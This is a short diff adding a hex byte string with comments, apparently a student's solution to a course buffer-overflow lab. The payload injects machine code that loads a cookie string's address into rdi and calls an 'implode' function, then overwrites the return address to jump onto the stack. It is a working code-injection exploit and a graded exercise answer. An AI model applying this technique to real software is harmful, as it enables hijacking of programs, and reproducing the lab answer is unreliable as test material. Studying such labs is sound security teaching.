@@ -1,0 +1,12 @@
+/* filler on the buffer */
+00 00 00 00 00 00 00 00
+/* assembly code, written in a .s file, moves my secret code into rdi and calls implode function */
+ 00 bf e7 92 60 55 68 63 17 40 00 c3
+/* more filler on the buffer */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* pointer to address on stack */
+ a1 92 60 55
+/* more filler, dummy zeros */
+ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* We want the string representing the bombcode to be past the stack for hexmatch, so that its not overwritten when we call hexmatch. That is why we have so many zeros above */
+ 35 64 32 31 36 36 30 65 00 00 
